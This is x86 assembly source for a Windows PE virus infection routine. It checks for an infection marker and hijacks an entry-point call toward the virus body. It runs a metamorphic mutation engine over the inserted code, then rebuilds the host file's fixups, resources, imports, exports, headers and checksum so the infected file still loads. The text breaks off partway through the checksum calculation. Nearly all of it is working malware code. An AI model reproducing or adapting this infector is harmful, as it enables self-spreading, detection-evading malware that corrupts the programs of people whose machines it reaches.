                            
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;IN:    
;	EDX = PE image bufer
;       ESI = intruded offset
;	ECX = intruded size
;	EAX = params
;	EDI = filesize
;       ---
;OUT:   EAX = new PE image size
;             FFFFFFFF if error occured
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

__code_RVA              equ             4 ptr [ebp]
__code_virt_size        equ             4 ptr [ebp+4]
__code_phys_size        equ             4 ptr [ebp+8]

__virt_size             equ             4 ptr [ebp+12]
__phys_size             equ             4 ptr [ebp+16]

__intruded              equ             4 ptr [ebp+20]
__size			equ		4 ptr [ebp+24]
__image                 equ             4 ptr [ebp+28]

__imagebase             equ             4 ptr [ebp+32]

__objtbldelta		equ		4 ptr [ebp+36]
__dasmtbl		equ		4 ptr [ebp+40]
__filesize		equ		4 ptr [ebp+44]

__code_obj	        equ             4 ptr [ebp+48]
__fixup_objvsize 	equ             4 ptr [ebp+52]

__seed		 	equ             4 ptr [ebp+56]
__param			equ		      [ebp+60]


infect:
		int 3
                pusha
                ntsub <60+SIZE ltmeparam>
                mov ebp,esp

                mov __filesize,edi
                mov __image,edx
		mov __size,ecx
		mov __intruded,esi

		xchg esi,eax					;
		lea edi,__param                                 ; copy params
		mov ecx,SIZE ltmeparam                          ;
		rep movsb                                       ;

;------------------------------------------------------------------------------

                cmp 2 ptr[edx],'ZM'                             ; MZ ?
                jne infect_error_exit				;

                cmp [edx.mz_tablOff],0040h                  	; New exe?
                jne infect_error_exit                           ;

		cmp 2 ptr[edx.mz_rsrvd1],'WD'			; Check label
		je infect_error_exit                            ;

                mov ebx,[edx.mz_peOffset]
                add ebx,edx

                cmp 4 ptr[ebx],'EP'                             ; PE\0\0 ?
                jne infect_error_exit

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

		xor eax,eax
		mov cx,[ebx.pe_flags]

		test cx,PEFLAGS_NOFIXUP				; FIXUPS?
		jnz infect_error_exit				;

                cmp [ebx.pe_fixupRVA],eax                  	; FIXUP obj =0?
                je infect_error_exit                            ; 

                cmp [ebx.pe_fixupSize],8			; FIXUP size <9?
                jbe infect_error_exit                           ;

                cmp [ebx.pe_debugRVA],eax                  	; DEBUG obj =0?
                jne infect_error_exit                           ;
                                                
                cmp [ebx.pe_exportRVA],eax                 	; EXPORT obj =0?
                jne pe_testDLL                                  ;

                cmp [ebx.pe_importRVA],eax                 	; IMPORT obj =0?
                jne pe_executable				;

pe_testDLL:
                test cx,PEFLAGS_DLL		                ; DLL ?
                jz infect_error_exit                            ;

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
pe_executable:

                movzx ecx,[ebx.pe_NThsize]	                ; Obj Table
		add ecx,18h					; Delta
		mov __objtbldelta,ecx				;

		add ecx,ebx

                mov eax,[ebx.pe_codeRVA]                        ;
                or eax,eax                                      ; CODE
                jz infect_error_exit                            ;
                mov __code_RVA,eax				;

		mov eax,[ecx.pe_Obj_vSize]			;
		or eax,eax					; Virtual
                jz infect_error_exit                            ;     Size = 0 ?
                mov __code_virt_size,eax			;

		mov eax,[ecx.pe_Obj_pSize]			; Physical Size
                mov __code_phys_size,eax                        ; 

		mov __code_obj,1
		mov __fixup_objvsize,0

		mov edi,[ecx.pe_Obj_RVA]			; EDI= 1st Object RVA
		mov esi,ecx					; ESI= Obj Table
		xor ecx,ecx

;------------------------------------------------------------------------------
@@validate_virtual:
		inc ecx

		mov eax,[ebx.pe_fixupRVA]				; Fixups?
		cmp [esi.pe_Obj_RVA],eax
		jne @@validate_code 

		mov eax,[esi.pe_Obj_vSize]			; Virtual fixup 
		mov __fixup_objvsize,eax                        ; size
		jmp @@validate_virtual_next

@@validate_code:

		cmp [esi.pe_Obj_RVA],edi			; Lesser RVA?
		jae @@validate_virtual_next                     ;

		mov edi,[esi.pe_Obj_RVA]                        ; Code object 
		mov __code_obj,ecx				;  number

@@validate_virtual_next:

		add esi,40
		cmp cx,[ebx.pe_objcnt]
		jne @@validate_virtual

;------------------------------------------------------------------------------

		cmp edi,__code_RVA    				; first virtual
		jne infect_error_exit                           ; section is code?

		cmp __fixup_objvsize,0				; Misplaced 
		je infect_error_exit                            ;  fixups

		mov eax,[ebx.pe_imagebase]			; Imagebase
		mov __imagebase,eax                             ;

;------------------------------------------------------------------------------

		push 4 ptr[ebx.pe_imagesize]                    ; 
                call malloc					; Image bufer
		add esp,4                                       ;

		or eax,eax                                      ; Malloc error?
		jz infect_error_exit				;


;∞ LOAD HEADERS ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                mov esi,edx                                     ; ESI = PE file
                xchg edx,eax                                    ; EDX = EDI
                mov edi,edx                                     ;      = PE image

                mov ecx,[ebx.pe_headersize]			; ECX = Header size

                push esi                                        ;
                rep movsb                                       ; Load headers
                pop esi                                         ; ESI = file PE

                mov ebx,[edx.mz_peOffset]			; EBX = PE image
                add ebx,edx                                     ;       header

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

		mov eax,__objtbldelta                           ; EAX = obj table
		add eax,ebx

                movzx ecx,[ebx.pe_objcnt]	                ; objects count

;∞ LOAD OBJECTS ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

virtual_load:
                mov edi,[eax.pe_Obj_RVA]                        ; object RVA

                push edi
                push esi
                push ecx

                add edi,edx                                     ; Image offset
                add esi,[eax.pe_Obj_offset]                     ; File  offset

                mov ecx,[eax.pe_Obj_vSize]

		cmp ecx,[eax.pe_Obj_pSize]
		jbe virtual_load_vsize
		mov ecx,[eax.pe_Obj_pSize]
virtual_load_vsize:
		
                rep movsb

                pop ecx
                pop esi
                pop edi

                dec ecx                                         ;
                jz virtual_load_exit                            ; Last section?

                add edi,[eax.pe_Obj_vSize]                      ;
                cmp edi,[(eax+40).pe_Obj_RVA]                   ; Check bounds
                ja infect_error_free

                add eax,40
                jmp virtual_load

virtual_load_exit:

;∞ DASM INIT ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                push 1000h
                call malloc
		add esp,4

		or eax,eax      				; Malloc error?
		jz infect_error_free                            ;
		
		push eax                                        ;  
                call ldizx_init                                 ;  unpack
		add esp,4                                       ;  tables
		mov __dasmtbl,eax

;∞ INIT RANDOMER ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

				
                call randomize
		mov __seed,eax

;€ UEP €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

                push DEE_LINKS					; *dee flags
		push __dasmtbl					; *dee dasm table
                pusho ldizx                                     ; *dee dasm

		lea eax,__seed					; *dee seed
		push eax                                        ;

                pusho rnd                                       ; *dee rnd
		pusho free					; *dee free
		pusho malloc                                    ; *dee malloc

		mov eax,__code_phys_size			;
		shr eax,1					; *dee csize
		push eax					;

                mov eax,[ebx.pe_RVA]	                        ; *dee code
                add eax,edx					; 
                push eax                                        ;

                call dee
		add esp,9*4
		
                inc eax                                         ;
                jz infect_error_free                            ; error ?
		dec eax

		;EAX =absolute adress with CALL cmd
		
		mov edi,eax                                     ;
		sub edi,edx					; EDI=rel. call offset

		lea ecx,[edi+5]					;
		add ecx,[eax+1]					; ECX=rel. destination
		mov __param.user_jmpdest,ecx                    ;

		mov esi,__code_RVA				;
		add esi,__code_phys_size       	                ; codeRVA+pSize
		mov __param.user_virusbase,esi                  ;

		sub esi,edi    					;
		sub esi,5                                       ; patch Call
		mov [eax+1],esi                                 ;

;€ PERMUTATE €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

		xor eax,eax
		inc eax
                mov __param.mixer_maxswp,eax			; maxswp = 1

		lea eax,__seed
		push eax                                        ; *ltme seed

		pusho rnd					; *ltmed rnd

                lea eax,__param                         	;
                push eax                                	; *ltme params

                push 0				         	; *ltme flags
		push __dasmtbl					; *ltme dasm table

                pusho ldizx                     	       	; *ltme dasm
                pusho my_mutator                        	; *ltme mutator
                push __size			            	; *ltme size
                pusho free                              	; *ltme free
                pusho malloc                            	; *ltme malloc
                push __intruded		                	; *ltme code entry

                call ltme_core
                add esp,4*11

		inc eax
		jz infect_error_free

		push __dasmtbl					;
		call free                                       ; release dasm
		add esp,4                                       ; table

;€ ALIGN SIZE €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

                mov edi,[ebx.pe_vAligment]                      ; virtual
                mov esi,[ebx.pe_pAligment]                      ; physical
		mov eax,__param.build_size

                push eax
                add eax,edi                                     ;
                neg edi                                         ;
                and eax,edi                                     ; virtual
                mov __virt_size,eax                             ; 
                pop eax

                add eax,esi                                     ;
                neg esi                                         ;
                and eax,esi                                     ; physical
                mov __phys_size,eax                             ; 

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€


;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤
; REBUILD LINKS
;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤

                mov esi,[ebx.pe_fixupRVA]			; ESI=fixups RVA
                add esi,edx                                     ;

                mov ecx,[ebx.pe_fixupSize]			; ECX=fixups size

		mov eax,ecx                                     ; Allocate
		shl eax,1 					; fixup bufer
		push eax					;
                call malloc                                     ;
		add esp,4

		or eax,eax      				; Malloc error?
		jz infect_error_free                            ;

                xchg edi,eax					; EDI = tablePtr

		push ebx
		push edi

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
links_fixup:

		lodsd                                           ; EBX = Fixup page
		xchg ebx,eax                                    ;

		lodsd                                           ; EAX = Block size
		or eax,eax
		jz links_exit

                sub ecx,eax
                sub eax,8
                shr eax,1

                push ecx                                        ; block size

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
links_entry:
                push eax
		push ebx

		xor eax,eax                                     ;
		lodsw 						; get fixup

		ror eax,4					;
		cmp AH,03h					; check type
		jne links_next

		rol eax,4					;
                and AH,0Fh                                      ; get offset
                add eax,ebx                                     ; 

                mov ebx,__code_RVA                              ; fixup in code?
                add ebx,__code_virt_size

		mov ecx,4 ptr[edx+eax]
		sub ecx,__imagebase

                cmp ecx,ebx                                     ;  < 'code' object
                jb links_lesscodeend

		mov ecx,__virt_size				;
                add [edx+eax],ecx	                        ;  patch offset
links_lesscodeend:

;-----------------------------------------------------------------------------

                cmp eax,ebx                                     ; in code?
                jb links_lesscodeend2

                add eax,__virt_size
links_lesscodeend2:

		stosd						; to fixup table
links_next:
		pop ebx
                pop eax

                dec eax                                         ; entries--
                jnz links_entry

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                pop ecx
                or ecx,ecx
                jnz links_fixup
links_exit:
		
		pop esi						; ESI=table
		pop ebx                                         ; header


                mov ecx,edi
		sub ecx,esi
                shr ecx,2
		jz infect_error_free

		call shsort					; sort table

;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤
;PATCH FIXUPS
;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤
;
; ESI = sorted table
; ECX = entries count

                mov edi,[ebx.pe_fixupRVA]                       ; EDI = fixup tbl
                add edi,edx                                     ;

		push edi
		push esi
                push edx
                push ebx

                mov edx,edi                                     ; EDX=block offset
                mov ebx,[esi]                                   ;
                and bx,0F000h		                        ; EBX=1st page

		add edi,8

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
new_fixups_main:
		push ecx
                lodsd                                           ; get RVA

                mov ecx,eax                                     ; ECX = fixup
                and cx,0F000h                                   ; get page 

                cmp ecx,ebx
                je new_fixups_same

;------------------------------------------------------------------------------

                mov [edx.fixup_pageRVA],ebx

                mov ebx,edi                                     ; block size
                sub ebx,edx                                     ;

		push eax
		mov eax,ebx
		and al,00000011b				; size MOD 4
		jz new_fixups_blocksize                         ;

		xor eax,eax
		stosw						; add align fixup
		add ebx,2

new_fixups_blocksize:
		pop eax

                mov [edx.fixup_size],ebx

                mov ebx,ecx                                     ; new page
                mov edx,edi                                     ; new block

		add edi,8

;------------------------------------------------------------------------------
new_fixups_same:

                and AH,0Fh                                      ; get offset
                or  AH,30h                                      ; set type
                stosw                                           ; write fixup

                pop ecx
		dec ecx
		jnz new_fixups_main

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                mov [edx.fixup_pageRVA],ebx
                mov eax,edi
                sub eax,edx
                mov [edx.fixup_size],eax

                pop ebx
                pop edx                                                 
		pop esi						; fixup table
		pop ecx						; old fixups

		push esi					;
		call free                                       ; release fixup
		add esp,4                                       ; bufer

		sub edi,ecx

                cmp edi,__fixup_objvsize			; Size is valid?
                ja infect_error_free                            ;

                mov [ebx.pe_fixupSize],edi

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

test_resources:
                mov eax,[ebx.pe_rsrcRVA]                        ; EAX= 
                or eax,eax                                      ; resources RVA?
                jz rsc_exit

;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤
;PATCH RESOURCES
;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤

                pusha

                add edx,eax
                mov ebx,__virt_size

;∞∞ Types table ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
 
                movzx ecx,[edx.rsrc_dir_num_cnt]
                mov esi,SIZE rsrc_dir                           ;esi=types pointer
@@explore_types:
;--[types]---------------------------------------------------------------------
                mov edi,[edx+esi.rsrc_entry_subdirRVA]
                test edi,edi
                js names_table

                add [edx+edi.rsrc_binRVA],ebx                   ;*patch
                jmp @@explore_types_next
names_table:
;∞∞ Names & Numbers table ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                and edi,(not 80000000h)

                push ecx

                movzx ecx,[edx+edi.rsrc_dir_num_cnt]            ;\
                movzx eax,[edx+edi.rsrc_dir_name_cnt]           ; > names & nums
                add ecx,eax                                     ;/

                add edi,SIZE rsrc_dir                           ;edi=names&num
@@explore_names:
;--[names&numbers]-------------------------------------------------------------
                mov eax,[edx+edi.rsrc_entry_subdirRVA]
                test eax,eax
                js language_table

                add [edx+eax.rsrc_binRVA],ebx                   ;*patch
                jmp @@explore_names_next

language_table:
;∞∞ Language table ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                and eax,(not 80000000h)

                push ecx
                movzx ecx,[edx+eax.rsrc_dir_num_cnt]
                add eax,SIZE rsrc_dir
;--[language]------------------------------------------------------------------
@@explore_languages:
                push eax
                mov eax,[edx+eax.rsrc_entry_subdirRVA]
                add [edx+eax.rsrc_binRVA],ebx                   ;*patch
                pop eax

                add eax,SIZE rsrc_description
                loop @@explore_languages
                pop ecx

@@explore_names_next:

                add edi,SIZE rsrc_dir_entry
                loop @@explore_names

                pop ecx
@@explore_types_next:

                add esi,SIZE rsrc_dir_entry
                loop @@explore_types

                popa

rsc_exit:
;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                mov ecx,[ebx.pe_importRVA]
                or ecx,ecx
                jz no_import

;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤
;PATCH IMPORT
;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤

                add ecx,edx
                mov eax,__virt_size

ip_dlls:
                mov edi,[ecx.import_lookupRVA]                  ; 00h
                mov esi,[ecx.import_adrRVA]                     ; 10h

                or esi,esi                                      ; last section?
                jz no_import

                add [ecx.import_nameRVA],eax                    ; patch nameRVA
                add [ecx.import_adrRVA],eax                     ; patch adr_tblRVA

                or edi,edi                                      ; 2nd import
                jnz ip_standart                                 ; type?

                mov edi,esi                                     ; lookup=adress
                jmp ip_lookup
ip_standart:
                add [ecx.import_lookupRVA],eax                  ; patch lookupRVA
ip_lookup:

;------------------------------------------------------------------------------

                add edi,edx                                     ; lookup table
ip_functions:
                test 4 ptr[edi],80000000h                       ; ordinal?
                jnz ip_func_next

                cmp 4 ptr[edi],0                                ; last function?
                jz ip_fnc_last

                add [edi],eax                                   ; patch fnct_nameRVA
ip_func_next:
                scasd                                           ; edi+4
                jmp ip_functions
ip_fnc_last:
;------------------------------------------------------------------------------
                add ecx,14h                                     ; next entry
                jmp ip_dlls
no_import:

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                mov eax,[ebx.pe_exportRVA]
                or eax,eax
                jz no_export

;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤
;PATCH EXPORT
;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤

                push edx

                add eax,edx                                     ; EAX=header

                mov edi,[eax.export_namepRVA]                   ; EDI=name array
                add edi,edx

                mov esi,[eax.export_adrRVA]                     ; ESI=adr array
                add esi,edx

                mov edx,__virt_size

                add [eax.export_nameRVA],edx                    ; \
                add [eax.export_adrRVA],edx                     ;  \ *patch
                add [eax.export_namepRVA],edx                   ;  /  rva's
                add [eax.export_ordRVA],edx                     ; /

;-----------------------------------------------------------------------------
                mov ecx,[eax.export_nampecnt]
p_exprt_name:
                add [edi],edx                                   ; *patch names
                scasd                                           ; edi+=4
                loop p_exprt_name

;-----------------------------------------------------------------------------
                mov ecx,[eax.export_adrcnt]
                mov edi,__code_RVA
                add edi,__code_virt_size
p_exprt_adr:
                lodsd
                or eax,eax                                      ; *patch adresses
                jz p_exprt_adr_next                             ; null elem?

                cmp eax,edi
                jb p_exprt_adr_next

                add 4 ptr[esi-4],edx                            ; *external export
p_exprt_adr_next:
                loop p_exprt_adr
;-----------------------------------------------------------------------------

                pop edx
;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞


no_export:

;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤
; Rebulid objects and header:
;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤

                mov esi,edx                                     ; ESI = image PE

		mov ecx,__filesize
		add ecx,__phys_size

		push ecx                                        ;
		push __image                                    ; file PE
		call realloc                                    ; reallocate bufer
		add esp,8

		or eax,eax      				; Realloc error?
		jz infect_error_free                            ;

		xchg eax,edi                                    ; EDI = reallocated file PE
		mov eax,__objtbldelta				; EAX = object table
		add eax,ebx                                     ;

		push ecx
;------------------------------------------------------------------------------

		xor ecx,ecx
;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤

@@dump_objects:
		inc ecx

                push edi
                push esi
		push ecx

                add esi,[eax.pe_Obj_RVA]

		cmp ecx,__code_obj
		jne @@obj_dump

;------------------------------------------------------------------------------

                add edi,[eax.pe_Obj_offset]
                mov ecx,[eax.pe_Obj_pSize]
                rep movsb

		mov esi,__param.build_offset
		mov ecx,__param.build_size
		rep movsb


		lea esi,[eax.pe_Obj_pSize]
		lea edi,[eax.pe_Obj_vSize]

		mov ecx,[esi]					; Phys size
		cmp ecx,[edi]					; > Virt Size
		jbe @@dump_code_correct

		mov [edi],ecx					; Virt size = Phys size

@@dump_code_correct:

                mov ecx,__phys_size
		add [esi],ecx

                mov ecx,__virt_size
                add [edi],ecx

		jmp @@dump_next 

;------------------------------------------------------------------------------
@@obj_dump:

		; ESI = obj RVA
                mov ecx,__virt_size
                add [eax.pe_Obj_RVA],ecx

                mov ecx,__phys_size
                add [eax.pe_Obj_offset],ecx

                mov ecx,[eax.pe_Obj_vSize]                      ; size

		cmp ecx,[eax.pe_Obj_pSize]			; Psize>Vsize
		jbe @@dump_obj_vsize                            ;
		mov ecx,[eax.pe_Obj_pSize]                      ;
@@dump_obj_vsize:

                add edi,[eax.pe_Obj_offset]                     ; new file offset
                rep movsb

;------------------------------------------------------------------------------
@@dump_next:

		pop ecx
                pop esi
                pop edi

                add eax,40

                cmp cx,[ebx.pe_objcnt]
		jne @@dump_objects

;------------------------------------------------------------------------------

                mov eax,__virt_size

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
;patch RVA's import,export,TLS,fixups,resources...
;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

		mov ecx,0Fh
RVAsize_patch:
		cmp 4 ptr[(ebx+78h)+ecx*8],0
		je RVAsize_next

		add 4 ptr[(ebx+78h)+ecx*8],eax
RVAsize_next:
		dec ecx
		jns RVAsize_patch


;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                add [ebx.pe_imagesize],eax                      ; *patch imagesize
                add [ebx.pe_codesize],eax                       ; *patch codesize

                cmp [ebx.pe_dataRVA],0
                je no_data_base

                add [ebx.pe_dataRVA],eax                        ; *patch data RVA
no_data_base:

                ;esi=PE image
                ;edi=PE file

		mov 2 ptr[esi.mz_rsrvd1],'WD'			; Write label

                mov ecx,[ebx.pe_headersize]
                push edi                                        ;
                rep movsb                                       ; copy headers
                pop esi                                         ; ESI = PE file

                mov ebx,[esi.mz_peOffset]                       ; old header
                add ebx,esi                                     ;

		pop ecx						; ECX = new file size

                cmp [ebx.pe_checksum],0
                je no_checksum

;∞ CALCULATE CHECKSUM ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

                mov [ebx.pe_checksum],0
		push edx
		push esi
                push ecx
		
                xor eax,eax                                     ; EAX
                cdq                                             ; =EDX=0
                shr ecx,1
calc_checksum:
                lodsw
                add edx,eax
                mov eax,edx

                shr eax,16                                      ; LOW
                movzx edx,dx                                    ;  +
                add edx,eax                                     ; HIGH

		dec ecx
		jnz calc_checksum

                mov eax,edx                                     ; HIGH
                shr edx,16                                      ;  +
                add dx,ax                                       ; LOW

                pop ecx
                add edx,ecx
